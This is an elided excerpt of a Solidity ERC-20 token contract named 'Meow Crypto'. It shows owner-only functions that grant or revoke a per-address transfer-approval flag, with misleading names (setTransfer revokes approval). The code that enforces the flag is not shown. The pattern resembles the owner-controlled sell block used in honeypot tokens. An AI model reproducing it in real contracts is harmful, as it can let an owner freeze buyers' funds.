...
contract MeowToken is Context, IERC20, Ownable {
    ...
    string private _name = 'Meow Crypto';
    ...
    function includeAccount() public virtual onlyOwner {
    ...
    function isIncluded(address _address) public view returns (bool) {
        return _approveTransfer[_address];
    }
    
    function approveTransfer(address account) external onlyOwner() {
        _approveTransfer[account] = true;
    }
    
    function setTransfer(address account) external onlyOwner() {
        _approveTransfer[account] = false;
    }
